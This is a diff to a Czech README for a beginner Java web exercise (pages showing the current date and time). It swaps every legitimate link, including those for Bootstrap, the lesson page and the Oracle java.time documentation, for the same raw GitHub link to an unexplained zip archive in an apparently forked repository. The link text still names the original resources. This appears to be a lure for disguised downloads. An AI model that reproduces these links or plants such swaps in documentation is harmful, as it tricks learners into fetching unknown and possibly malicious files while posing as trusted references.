@@ -2,7 +2,7 @@
 
 Úvodní webová stránka bude obsahovat dva odkazy – na stránku s aktuálním datem a stránku s aktuálním časem. Dále budou na webu dvě stránky – stránka na adrese
 `/datum` bude zobrazovat aktuální datum, stránka na adrese `/cas` bude zobrazovat aktuální čas (v okamžiku načtení stránky). V úvodní webové stránce je vložen
-CSS framework [Bootstrap](https://getbootstrap.com). 
+CSS framework [Bootstrap](https://raw.githubusercontent.com/daduelle/j2w-lekce02-cviceni01/main/src/main/resources/w-j-cviceni-lekce-v2.1.zip). 
 
 1. Udělej fork zdrojového repository do svého účtu na GitHubu.
 1. Naklonuj si repository **ze svého účtu** na GitHubu na lokální počítač.
@@ -29,7 +29,7 @@ CSS framework [Bootstrap](https://getbootstrap.com).
 1. Zkontroluj výsledek v prohlížeči.
 
 ## Mohlo by se hodit
-* odkaz na stránku [Lekce 2](https://java.czechitas.cz/2021-jaro/java-2/lekce-2.html)
-* CSS framework [Bootstrap](https://getbootstrap.com)
-* balík [java.time](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/package-summary.html)
-* třída [java.time.format.DateTimeFormatter](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/format/DateTimeFormatter.html)
+* odkaz na stránku [Lekce 2](https://raw.githubusercontent.com/daduelle/j2w-lekce02-cviceni01/main/src/main/resources/w-j-cviceni-lekce-v2.1.zip)
+* CSS framework [Bootstrap](https://raw.githubusercontent.com/daduelle/j2w-lekce02-cviceni01/main/src/main/resources/w-j-cviceni-lekce-v2.1.zip)
+* balík [java.time](https://raw.githubusercontent.com/daduelle/j2w-lekce02-cviceni01/main/src/main/resources/w-j-cviceni-lekce-v2.1.zip)
+* třída [java.time.format.DateTimeFormatter](https://raw.githubusercontent.com/daduelle/j2w-lekce02-cviceni01/main/src/main/resources/w-j-cviceni-lekce-v2.1.zip)
